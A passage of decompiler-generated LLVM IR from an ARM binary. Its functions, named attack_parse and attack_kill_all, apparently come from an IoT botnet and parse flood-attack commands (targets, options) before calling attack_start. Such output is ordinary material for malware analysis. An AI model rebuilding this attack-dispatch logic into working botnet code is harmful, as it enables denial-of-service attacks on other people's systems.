  %v2_a010 = icmp eq i32 %v0_a000, 0
  br i1 %v2_a010, label %dec_label_pc_a018, label %dec_label_pc_a03c

dec_label_pc_a018:                                ; preds = %dec_label_pc_a010
  %v0_a018 = load i32, i32* @r6, align 4
  %v1_a01c = call i32 @sleep(i32 %v0_a018)
  store i32 %v1_a01c, i32* @r0, align 4
  %v0_a020 = call i32 @getppid()
  %v2_a028 = call i32 @kill(i32 %v0_a020, i32 9)
  %v0_a02c = load i32, i32* @r4, align 4
  %v1_a030 = call i32 @__GI_exit(i32 %v0_a02c)
  br label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %dec_label_pc_a000, %dec_label_pc_a018
  %v0_a034 = load i32, i32* @r5, align 4
  %v1_a038 = call i32 @__GI_exit(i32 %v0_a034)
  br label %dec_label_pc_a03c

dec_label_pc_a03c:                                ; preds = %dec_label_pc_a010, %dec_label_pc_a034
  store i32 ptrtoint (i8** @global_var_24314.64 to i32), i32* %r3.global-to-local, align 4
  %v2_a040 = load i8, i8* bitcast (i8** @global_var_24314.64 to i8*), align 4
  %v3_a040 = zext i8 %v2_a040 to i32
  %v2_a044 = icmp eq i8 %v2_a040, 0
  br i1 %v2_a044, label %dec_label_pc_a088, label %dec_label_pc_a04c

dec_label_pc_a04c:                                ; preds = %dec_label_pc_a03c
  store i32 ptrtoint (i32* @global_var_24318.66 to i32), i32* %r3.global-to-local, align 4
  %v2_a050 = load i32, i32* @global_var_24318.66, align 4
  %v1_a054 = inttoptr i32 %v2_a050 to i32*
  %v2_a054 = load i32, i32* %v1_a054, align 4
  store i32 %v2_a054, i32* @ip, align 4
  %v1_a058 = add i32 %v2_a054, 4
  %v2_a058 = inttoptr i32 %v1_a058 to i8*
  %v3_a058 = load i8, i8* %v2_a058, align 1
  %v4_a058 = zext i8 %v3_a058 to i32
  store i32 %v4_a058, i32* %r3.global-to-local, align 4
  %v1_a05c = load i32, i32* @r7, align 4
  %v9_a05c = icmp eq i32 %v4_a058, %v1_a05c
  br i1 %v9_a05c, label %dec_label_pc_a090, label %dec_label_pc_a07c.preheader

dec_label_pc_a07c.preheader:                      ; preds = %dec_label_pc_a04c
  %v1_a060 = load i32, i32* @r5, align 4
  br label %dec_label_pc_a07c

dec_label_pc_a06c:                                ; preds = %dec_label_pc_a07c
  %v4_a06c = mul i32 %v1_a07c, 4
  %v5_a06c = add i32 %v4_a06c, %v2_a050
  %v6_a06c = inttoptr i32 %v5_a06c to i32*
  %v7_a06c = load i32, i32* %v6_a06c, align 4
  store i32 %v7_a06c, i32* @ip, align 4
  %v1_a070 = add i32 %v7_a06c, 4
  %v2_a070 = inttoptr i32 %v1_a070 to i8*
  %v3_a070 = load i8, i8* %v2_a070, align 1
  %v4_a070 = zext i8 %v3_a070 to i32
  store i32 %v4_a070, i32* %r3.global-to-local, align 4
  %v9_a074 = icmp eq i32 %v4_a070, %v1_a05c
  br i1 %v9_a074, label %dec_label_pc_a090, label %dec_label_pc_a07c

dec_label_pc_a07c:                                ; preds = %dec_label_pc_a07c.preheader, %dec_label_pc_a06c
  %v0_a07c = phi i32 [ %v1_a060, %dec_label_pc_a07c.preheader ], [ %v1_a07c, %dec_label_pc_a06c ]
  %v1_a07c = add i32 %v0_a07c, 1
  %v9_a080 = icmp eq i32 %v1_a07c, %v3_a040
  br i1 %v9_a080, label %dec_label_pc_a088, label %dec_label_pc_a06c

dec_label_pc_a088:                                ; preds = %dec_label_pc_a07c, %dec_label_pc_a03c, %dec_label_pc_a090
  %v1_a08c = call i32 @__GI_exit(i32 0)
  %v0_a0a0.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_a090

dec_label_pc_a090:                                ; preds = %dec_label_pc_a06c, %dec_label_pc_a04c, %dec_label_pc_a088
  %v0_a0a0 = phi i32 [ %v2_a054, %dec_label_pc_a04c ], [ %v0_a0a0.pre, %dec_label_pc_a088 ], [ %v7_a06c, %dec_label_pc_a06c ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_a0a0 = inttoptr i32 %v0_a0a0 to i32*
  %v2_a0a0 = load i32, i32* %v1_a0a0, align 4
  store i32 %v2_a0a0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_a0a0)
  br label %dec_label_pc_a088

; uselistorder directives
  uselistorder i32 %v1_a07c, { 2, 0, 1 }
  uselistorder i32 %v0_a000, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_9fd8, { 1, 0 }
  uselistorder i32 %v0_9fd4, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_a090, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a088, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a07c, { 1, 0 }
  uselistorder label %dec_label_pc_a03c, { 1, 0 }
  uselistorder label %dec_label_pc_a034, { 1, 0 }
  uselistorder label %dec_label_pc_9ff8, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_a0b8 = load i32, i32* @r5, align 4
  %v9_a0b8 = load i32, i32* @r6, align 4
  %v12_a0b8 = load i32, i32* @r7, align 4
  %v18_a0b8 = load i32, i32* @sb, align 4
  %v21_a0b8 = load i32, i32* @sl, align 4
  %v24_a0b8 = load i32, i32* @fp, align 4
  %v2_a0bc = icmp ugt i32 %arg2, 2
  %v7_a0bc = icmp eq i32 %arg2, 3
  store i1 %v7_a0bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_a0c8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a0c8, i32* @r5, align 4
  %v2_a0cc = xor i1 %v7_a0bc, true
  %v3_a0cc = and i1 %v2_a0bc, %v2_a0cc
  br i1 %v3_a0cc, label %dec_label_pc_a0dc, label %dec_label_pc_a0d0

dec_label_pc_a0d0:                                ; preds = %dec_label_pc_a11c, %.dec_label_pc_a0d0_crit_edge, %dec_label_pc_a110, %dec_label_pc_a100, %dec_label_pc_a0dc, %entry, %dec_label_pc_a2c8
  %v1_a0d8 = phi i32 [ %v1_a0d8.pre, %.dec_label_pc_a0d0_crit_edge ], [ %v1_a0e0, %dec_label_pc_a11c ], [ %v1_a0e0, %dec_label_pc_a110 ], [ %v1_a0e0, %dec_label_pc_a100 ], [ %v1_a0e0, %dec_label_pc_a0dc ], [ %v0_a0c8, %entry ], [ %v0_a2cc, %dec_label_pc_a2c8 ]
  store i32 %v6_a0b8, i32* @r5, align 4
  store i32 %v9_a0b8, i32* @r6, align 4
  store i32 %v12_a0b8, i32* @r7, align 4
  store i32 %v18_a0b8, i32* @sb, align 4
  store i32 %v21_a0b8, i32* @sl, align 4
  store i32 %v24_a0b8, i32* @fp, align 4
  ret i32 %v1_a0d8

dec_label_pc_a0dc:                                ; preds = %entry
  %v1_a0dc = inttoptr i32 %v0_a0c8 to i32*
  %v2_a0dc = load i32, i32* %v1_a0dc, align 4
  store i32 %v2_a0dc, i32* %r1.global-to-local, align 4
  %v1_a0e0 = and i32 %v2_a0dc, 16711680
  store i32 %v1_a0e0, i32* %r0.global-to-local, align 4
  %v3_a0e4 = udiv i32 %v2_a0dc, 16777216
  %v4_a0e8 = udiv i32 %v1_a0e0, 256
  %v5_a0e8 = or i32 %v4_a0e8, %v3_a0e4
  %v1_a0ec = and i32 %v2_a0dc, 65280
  store i32 %v1_a0ec, i32* %r2.global-to-local, align 4
  %v4_a0f0 = mul nuw nsw i32 %v1_a0ec, 256
  %v5_a0f0 = or i32 %v5_a0e8, %v4_a0f0
  store i32 %v5_a0f0, i32* %r3.global-to-local, align 4
  %v7_a0f4 = icmp eq i32 %arg2, 4
  store i1 %v7_a0f4, i1* %cpsr_z.global-to-local, align 1
  %v5_a0f8 = call i32 @llvm.bswap.i32(i32 %v2_a0dc)
  store i32 %v5_a0f8, i32* @fp, align 4
  br i1 %v7_a0f4, label %dec_label_pc_a0d0, label %dec_label_pc_a100

dec_label_pc_a100:                                ; preds = %dec_label_pc_a0dc
  %v1_a100 = add i32 %v0_a0c8, 4
  %v2_a100 = inttoptr i32 %v1_a100 to i8*
  %v3_a100 = load i8, i8* %v2_a100, align 1
  %v4_a100 = zext i8 %v3_a100 to i32
  store i32 %v4_a100, i32* %r2.global-to-local, align 4
  %v7_a104 = icmp eq i32 %arg2, 5
  store i1 %v7_a104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a104, label %dec_label_pc_a0d0, label %dec_label_pc_a110

dec_label_pc_a110:                                ; preds = %dec_label_pc_a100
  %v1_a110 = add i32 %v0_a0c8, 5
  %v2_a110 = inttoptr i32 %v1_a110 to i8*
  %v3_a110 = load i8, i8* %v2_a110, align 1
  %v4_a110 = zext i8 %v3_a110 to i32
  store i32 %v4_a110, i32* @sb, align 4
  %v2_a114 = icmp eq i8 %v3_a110, 0
  store i1 %v2_a114, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a114, label %dec_label_pc_a0d0, label %dec_label_pc_a11c

dec_label_pc_a11c:                                ; preds = %dec_label_pc_a110
  %v2_a120 = mul nuw nsw i32 %v4_a110, 5
  store i32 %v2_a120, i32* @r7, align 4
  %v1_a124 = add i32 %arg2, -6
  store i32 %v1_a124, i32* %r3.global-to-local, align 4
  %v3_a128 = icmp ult i32 %v1_a124, %v2_a120
  %v9_a128 = icmp eq i32 %v1_a124, %v2_a120
  store i1 %v9_a128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a128, label %dec_label_pc_a0d0, label %dec_label_pc_a130

dec_label_pc_a130:                                ; preds = %dec_label_pc_a11c
  store i32 %v4_a110, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_a124, i32* @r6, align 4
  %v2_a13c = call i32 @calloc(i32 %v4_a110, i32 24)
  store i32 %v2_a13c, i32* %ip.global-to-local, align 4
  %v0_a148 = load i32, i32* @r7, align 4
  %v1_a148 = load i32, i32* @r4, align 4
  %v2_a148 = sub i32 %v1_a148, %v0_a148
  store i32 %v2_a148, i32* @r7, align 4
  %v0_a14c = load i32, i32* @r5, align 4
  %v1_a14c = add i32 %v0_a14c, 11
  store i32 %v1_a14c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a150

dec_label_pc_a150:                                ; preds = %dec_label_pc_a150, %dec_label_pc_a130
  %v1_a154 = phi i32 [ %v1_a180, %dec_label_pc_a150 ], [ %v2_a13c, %dec_label_pc_a130 ]
  %v0_a150 = phi i32 [ %v1_a17c, %dec_label_pc_a150 ], [ %v1_a14c, %dec_label_pc_a130 ]
  %v1_a150 = add i32 %v0_a150, -5
  %v2_a150 = inttoptr i32 %v1_a150 to i32*
  %v3_a150 = load i32, i32* %v2_a150, align 4
  store i32 %v3_a150, i32* %r1.global-to-local, align 4
  %v2_a154 = add i32 %v1_a154, 16
  %v3_a154 = inttoptr i32 %v2_a154 to i32*
  store i32 %v3_a150, i32* %v3_a154, align 4
  %v0_a158 = load i32, i32* @r7, align 4
  %v1_a158 = add i32 %v0_a158, -6
  store i32 %v1_a158, i32* %r3.global-to-local, align 4
  %v0_a15c = load i32, i32* %r0.global-to-local, align 4
  %v1_a15c = add i32 %v0_a15c, -1
  %v2_a15c = inttoptr i32 %v1_a15c to i8*
  %v3_a15c = load i8, i8* %v2_a15c, align 1
  %v4_a15c = zext i8 %v3_a15c to i32
  store i32 %v4_a15c, i32* %r2.global-to-local, align 4
  %v0_a160 = load i32, i32* @r6, align 4
  %v1_a160 = add i32 %v0_a160, -5
  store i32 %v1_a160, i32* @r6, align 4
  %v9_a164 = icmp eq i32 %v1_a160, %v1_a158
  store i1 %v9_a164, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_a15c, i32* @r4, align 4
  %v2_a170 = load i32, i32* %ip.global-to-local, align 4
  %v3_a170 = add i32 %v2_a170, 20
  %v4_a170 = inttoptr i32 %v3_a170 to i8*
  store i8 %v3_a15c, i8* %v4_a170, align 1
  %v0_a174 = load i32, i32* %r1.global-to-local, align 4
  %v1_a174 = load i32, i32* %ip.global-to-local, align 4
  %v2_a174 = add i32 %v1_a174, 4
  %v3_a174 = inttoptr i32 %v2_a174 to i32*
  store i32 %v0_a174, i32* %v3_a174, align 4
  %v0_a178 = load i32, i32* %r3.global-to-local, align 4
  %v1_a178 = trunc i32 %v0_a178 to i16
  %v2_a178 = load i32, i32* %ip.global-to-local, align 4
  %v3_a178 = inttoptr i32 %v2_a178 to i16*
  store i16 %v1_a178, i16* %v3_a178, align 2
  %v0_a17c = load i32, i32* %r0.global-to-local, align 4
  %v1_a17c = add i32 %v0_a17c, 5
  store i32 %v1_a17c, i32* %r0.global-to-local, align 4
  %v0_a180 = load i32, i32* %ip.global-to-local, align 4
  %v1_a180 = add i32 %v0_a180, 24
  store i32 %v1_a180, i32* %ip.global-to-local, align 4
  %v0_a184 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a184, label %dec_label_pc_a188, label %dec_label_pc_a150

dec_label_pc_a188:                                ; preds = %dec_label_pc_a150
  %v0_a188 = load i32, i32* @r6, align 4
  %v2_a188 = icmp eq i32 %v0_a188, 0
  store i1 %v2_a188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a188, label %dec_label_pc_a28c, label %dec_label_pc_a190

dec_label_pc_a190:                                ; preds = %dec_label_pc_a188
  %v0_a190 = load i32, i32* @r4, align 4
  %v1_a190 = inttoptr i32 %v0_a190 to i8*
  %v2_a190 = load i8, i8* %v1_a190, align 1
  %v3_a190 = zext i8 %v2_a190 to i32
  store i32 %v3_a190, i32* @r5, align 4
  %v2_a194 = icmp eq i8 %v2_a190, 0
  store i1 %v2_a194, i1* %cpsr_z.global-to-local, align 1
  %v0_a198 = load i32, i32* @r7, align 4
  %v1_a198 = add i32 %v0_a198, -7
  store i32 %v1_a198, i32* @r8, align 4
  br i1 %v2_a194, label %bb, label %dec_label_pc_a1a4

bb:                                               ; preds = %dec_label_pc_a190
  store i32 %v3_a190, i32* @r6, align 4
  br label %dec_label_pc_a268

dec_label_pc_a1a4:                                ; preds = %dec_label_pc_a190
  store i32 %v3_a190, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a1ac = call i32 @calloc(i32 %v3_a190, i32 8)
  store i32 %v2_a1ac, i32* %r0.global-to-local, align 4
  %v0_a1b0 = load i32, i32* @r8, align 4
  %v2_a1b0 = icmp eq i32 %v0_a1b0, 0
  store i1 %v2_a1b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a1ac, i32* @r6, align 4
  br i1 %v2_a1b0, label %dec_label_pc_a28c, label %dec_label_pc_a1bc

dec_label_pc_a1bc:                                ; preds = %dec_label_pc_a1a4
  %v0_a1bc = load i32, i32* @r4, align 4
  %v1_a1bc = add i32 %v0_a1bc, 1
  %v2_a1bc = inttoptr i32 %v1_a1bc to i8*
  %v3_a1bc = load i8, i8* %v2_a1bc, align 1
  %v0_a1c0 = load i32, i32* @r7, align 4
  %v7_a1c0 = icmp eq i32 %v0_a1c0, 8
  store i1 %v7_a1c0, i1* %cpsr_z.global-to-local, align 1
  %v3_a1c4 = add i32 %v2_a1ac, 4
  %v4_a1c4 = inttoptr i32 %v3_a1c4 to i8*
  store i8 %v3_a1bc, i8* %v4_a1c4, align 1
  %v0_a1c8 = load i32, i32* @r4, align 4
  %v1_a1c8 = add i32 %v0_a1c8, 1
  store i32 %v1_a1c8, i32* %r3.global-to-local, align 4
  %v0_a1cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1cc, label %dec_label_pc_a28c, label %dec_label_pc_a1d0

dec_label_pc_a1d0:                                ; preds = %dec_label_pc_a1bc
  %v1_a1d0 = add i32 %v0_a1c8, 2
  %v2_a1d0 = inttoptr i32 %v1_a1d0 to i8*
  %v3_a1d0 = load i8, i8* %v2_a1d0, align 1
  %v4_a1d0 = zext i8 %v3_a1d0 to i32
  store i32 %v4_a1d0, i32* @r4, align 4
  %v0_a1d4 = load i32, i32* @r7, align 4
  %v1_a1d4 = add i32 %v0_a1d4, -9
  store i32 %v1_a1d4, i32* @r8, align 4
  %v9_a1d8 = icmp eq i32 %v1_a1d4, %v4_a1d0
  store i1 %v9_a1d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a1d0, i32* %r1.global-to-local, align 4
  %v5_a1e0 = icmp slt i32 %v1_a1d4, %v4_a1d0
  br i1 %v5_a1e0, label %dec_label_pc_a28c, label %bb35

bb35:                                             ; preds = %dec_label_pc_a1d0
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_a1e47 = add i32 %v0_a1c8, 3
  store i32 %v7_a1e47, i32* @r7, align 4
  %v6_a1e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_a1e8, i32* @sl, align 4
  br label %dec_label_pc_a22c

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a22c
  %v0_a1f8 = load i32, i32* @r8, align 4
  %v1_a1f8 = load i32, i32* @r4, align 4
  %v2_a1f8 = sub i32 %v0_a1f8, %v1_a1f8
  store i32 %v2_a1f8, i32* %r2.global-to-local, align 4
  %v9_a1f8 = icmp eq i32 %v0_a1f8, %v1_a1f8
  store i1 %v9_a1f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a1f8, label %dec_label_pc_a28c, label %dec_label_pc_a200

dec_label_pc_a200:                                ; preds = %dec_label_pc_a1f8
  %v1_a200 = load i32, i32* @r7, align 4
  %v2_a200 = add i32 %v1_a200, %v1_a1f8
  %v3_a200 = inttoptr i32 %v2_a200 to i8*
  %v4_a200 = load i8, i8* %v3_a200, align 1
  store i32 %v2_a200, i32* %r0.global-to-local, align 4
  %v1_a208 = add i32 %v2_a1f8, -1
  store i32 %v1_a208, i32* %r2.global-to-local, align 4
  %v7_a208 = icmp eq i32 %v2_a1f8, 1
  store i1 %v7_a208, i1* %cpsr_z.global-to-local, align 1
  %v3_a20c = add i32 %v2_a260, 4
  %v4_a20c = inttoptr i32 %v3_a20c to i8*
  store i8 %v4_a200, i8* %v4_a20c, align 1
  %v0_a210 = load i32, i32* %r0.global-to-local, align 4
  %v1_a210 = add i32 %v0_a210, 1
  store i32 %v1_a210, i32* %r3.global-to-local, align 4
  %v0_a214 = load i32, i32* %r2.global-to-local, align 4
  %v1_a214 = add i32 %v0_a214, -1
  store i32 %v1_a214, i32* @r8, align 4
  %v1_a218 = add i32 %v0_a210, 2
  store i32 %v1_a218, i32* @r7, align 4
  %v0_a21c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a21c, label %dec_label_pc_a28c, label %dec_label_pc_a220

dec_label_pc_a220:                                ; preds = %dec_label_pc_a200
  %v2_a220 = inttoptr i32 %v1_a210 to i8*
  %v3_a220 = load i8, i8* %v2_a220, align 1
  %v4_a220 = zext i8 %v3_a220 to i32
  store i32 %v4_a220, i32* @r4, align 4
  %v2_a224 = sub i32 %v1_a214, %v4_a220
  %tmp36 = sub i32 0, %v2_a224
  %v6_a224 = and i32 %v1_a214, %tmp36
  %v7_a224 = icmp slt i32 %v6_a224, 0
  %v8_a224 = icmp slt i32 %v2_a224, 0
  %v9_a224 = icmp eq i32 %v1_a214, %v4_a220
  store i1 %v9_a224, i1* %cpsr_z.global-to-local, align 1
  %v2_a228 = xor i1 %v8_a224, %v7_a224
  br i1 %v2_a228, label %dec_label_pc_a28c, label %dec_label_pc_a22c

dec_label_pc_a22c:                                ; preds = %bb35, %dec_label_pc_a220
  %v0_a230 = phi i32 [ %v4_a1d0, %bb35 ], [ %v4_a220, %dec_label_pc_a220 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_a240, %dec_label_pc_a220 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_a230 = add nuw nsw i32 %v0_a230, 1
  store i32 %v1_a230, i32* %r0.global-to-local, align 4
  %v2_a234 = call i32 @calloc(i32 %v1_a230, i32 1)
  store i32 %v2_a234, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_a23c = load i32, i32* @sl, align 4
  %v2_a23c = inttoptr i32 %v1_a23c to i32*
  store i32 %v2_a234, i32* %v2_a23c, align 4
  %v0_a240 = load i32, i32* %r3.global-to-local, align 4
  %v1_a240 = add i32 %v0_a240, 1
  store i32 %v1_a240, i32* %r3.global-to-local, align 4
  %v0_a244 = load i32, i32* @r4, align 4
  store i32 %v0_a244, i32* %r2.global-to-local, align 4
  %v0_a248 = load i32, i32* @r7, align 4
  store i32 %v0_a248, i32* %r1.global-to-local, align 4
  %v3_a250 = call i32 @util_memcpy(i32 %v2_a234, i32 %v0_a248, i32 %v0_a244)
  store i32 %v3_a250, i32* %r0.global-to-local, align 4
  store i32 %v1_a240, i32* %r2.global-to-local, align 4
  %v3_a258 = mul i32 %v1_a240, 8
  store i32 %v3_a258, i32* %r3.global-to-local, align 4
  %v1_a25c = load i32, i32* @r5, align 4
  %v9_a25c = icmp eq i32 %v1_a240, %v1_a25c
  store i1 %v9_a25c, i1* %cpsr_z.global-to-local, align 1
  %v0_a260 = load i32, i32* @r6, align 4
  %v2_a260 = add i32 %v0_a260, %v3_a258
  store i32 %v2_a260, i32* @sl, align 4
  br i1 %v9_a25c, label %dec_label_pc_a268, label %dec_label_pc_a1f8

dec_label_pc_a268:                                ; preds = %dec_label_pc_a22c, %bb
  %v0_a268 = call i32 @__GI___errno_location()
  %v2_a270 = inttoptr i32 %v0_a268 to i32*
  store i32 0, i32* %v2_a270, align 4
  store i32 %v4_a100, i32* %r1.global-to-local, align 4
  %v0_a278 = load i32, i32* @fp, align 4
  store i32 %v0_a278, i32* %r0.global-to-local, align 4
  %v0_a27c = load i32, i32* @sb, align 4
  store i32 %v0_a27c, i32* %r2.global-to-local, align 4
  store i32 %v2_a13c, i32* %r3.global-to-local, align 4
  %v2_a284 = load i32, i32* @r5, align 4
  %v5_a284 = load i32, i32* @r6, align 4
  %v6_a288 = trunc i32 %v2_a284 to i8
  %v7_a288 = call i32 @attack_start(i32 %v0_a278, i32 %v4_a100, i32 %v0_a27c, i32 %v2_a13c, i8 %v6_a288, i32 %v5_a284)
  store i32 %v7_a288, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a28c

dec_label_pc_a28c:                                ; preds = %dec_label_pc_a220, %dec_label_pc_a200, %dec_label_pc_a1f8, %dec_label_pc_a1d0, %dec_label_pc_a1bc, %dec_label_pc_a1a4, %dec_label_pc_a188, %dec_label_pc_a268
  store i32 %v2_a13c, i32* %r3.global-to-local, align 4
  %v2_a290 = icmp eq i32 %v2_a13c, 0
  store i1 %v2_a290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a290, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_a28c
  store i32 %v2_a13c, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_a28c, %bb37
  store i32 41628, i32* @lr, align 4
  %v1_a298 = xor i1 %v2_a290, true
  call void @__pseudo_cond_branch(i1 %v1_a298, i32 ptrtoint (i32* @global_var_14eb8.68 to i32))
  %v0_a29c = load i32, i32* @r6, align 4
  %v2_a29c = icmp eq i32 %v0_a29c, 0
  store i1 %v2_a29c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a29c, label %.dec_label_pc_a0d0_crit_edge, label %dec_label_pc_a2a4

.dec_label_pc_a0d0_crit_edge:                     ; preds = %bb38
  %v1_a0d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0d0

dec_label_pc_a2a4:                                ; preds = %bb38
  %v0_a2a4 = load i32, i32* @r5, align 4
  %v2_a2a4 = icmp eq i32 %v0_a2a4, 0
  store i1 %v2_a2a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a2a4, label %dec_label_pc_a2c8, label %dec_label_pc_a2ac

dec_label_pc_a2ac:                                ; preds = %dec_label_pc_a2a4
  br label %dec_label_pc_a2b0

dec_label_pc_a2b0:                                ; preds = %dec_label_pc_a2b0, %dec_label_pc_a2ac
  %v0_a2b8 = phi i32 [ 0, %dec_label_pc_a2ac ], [ %v1_a2c0, %dec_label_pc_a2b0 ]
  %v0_a2b0 = phi i32 [ %v0_a29c, %dec_label_pc_a2ac ], [ %v0_a2c8.pre, %dec_label_pc_a2b0 ]
  %v4_a2b0 = mul i32 %v0_a2b8, 8
  %v5_a2b0 = add i32 %v4_a2b0, %v0_a2b0
  %v6_a2b0 = inttoptr i32 %v5_a2b0 to i32*
  %v7_a2b0 = load i32, i32* %v6_a2b0, align 4
  store i32 %v7_a2b0, i32* %r0.global-to-local, align 4
  %v2_a2b4 = icmp eq i32 %v7_a2b0, 0
  store i1 %v2_a2b4, i1* %cpsr_z.global-to-local, align 1
  %v1_a2b8 = add i32 %v0_a2b8, 1
  store i32 %v1_a2b8, i32* @r4, align 4
  store i32 41664, i32* @lr, align 4
  %v1_a2bc = xor i1 %v2_a2b4, true
  call void @__pseudo_cond_branch(i1 %v1_a2bc, i32 ptrtoint (i32* @global_var_14eb8.68 to i32))
  %v0_a2c0 = load i32, i32* @r5, align 4
  %v1_a2c0 = load i32, i32* @r4, align 4
  %v9_a2c0 = icmp eq i32 %v0_a2c0, %v1_a2c0
  store i1 %v9_a2c0, i1* %cpsr_z.global-to-local, align 1
  %v0_a2c8.pre = load i32, i32* @r6, align 4
  br i1 %v9_a2c0, label %dec_label_pc_a2c8, label %dec_label_pc_a2b0

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a2b0, %dec_label_pc_a2a4
  %v0_a2c8 = phi i32 [ %v0_a29c, %dec_label_pc_a2a4 ], [ %v0_a2c8.pre, %dec_label_pc_a2b0 ]
  store i32 %v0_a2c8, i32* @r0, align 4
  %v0_a2cc = call i32 @free()
  store i32 %v0_a2cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0d0

; uselistorder directives
  uselistorder i32 %v0_a2cc, { 1, 0 }
  uselistorder i32 %v1_a2c0, { 1, 0 }
  uselistorder i1 %v2_a290, { 0, 2, 1 }
  uselistorder i32 %v2_a260, { 1, 0 }
  uselistorder i32 %v3_a258, { 1, 0 }
  uselistorder i32 %v1_a240, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_a224, { 1, 0 }
  uselistorder i32 %v4_a220, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a214, { 2, 0, 1, 3 }
  uselistorder i32 %v3_a190, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a180, { 1, 0 }
  uselistorder i32 %v1_a17c, { 1, 0 }
  uselistorder i32 %v2_a13c, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_a110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a0e0, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_a0dc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_a0c8, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 17, 4, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_a28c, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_a22c, { 1, 0 }
  uselistorder label %dec_label_pc_a0d0, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_kill_all(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v3_a2d4 = load i32, i32* @r4, align 4
  %v6_a2d4 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2431c.70 to i32), i32* @r4, align 4
  %v2_a2dc = load i32, i32* @global_var_2431c.70, align 4
  store i32 %v2_a2dc, i32* %r0.global-to-local, align 4
  %v2_a2e0 = icmp eq i32 %v2_a2dc, 0
  br i1 %v2_a2e0, label %dec_label_pc_a2ec, label %dec_label_pc_a374

dec_label_pc_a2ec:                                ; preds = %entry
  %v3_a2ec = load i32, i32* @global_var_24320.71, align 4
  store i32 %v3_a2ec, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v2_a2f4 = icmp eq i32 %v3_a2ec, 0
  store i32 0, i32* @global_var_2431c.70, align 4
  br i1 %v2_a2f4, label %dec_label_pc_a300, label %dec_label_pc_a390

dec_label_pc_a300:                                ; preds = %dec_label_pc_a374.dec_label_pc_a300_crit_edge, %dec_label_pc_a2ec
  %v0_a308 = phi i32 [ %v0_a308.pre, %dec_label_pc_a374.dec_label_pc_a300_crit_edge ], [ 0, %dec_label_pc_a2ec ]
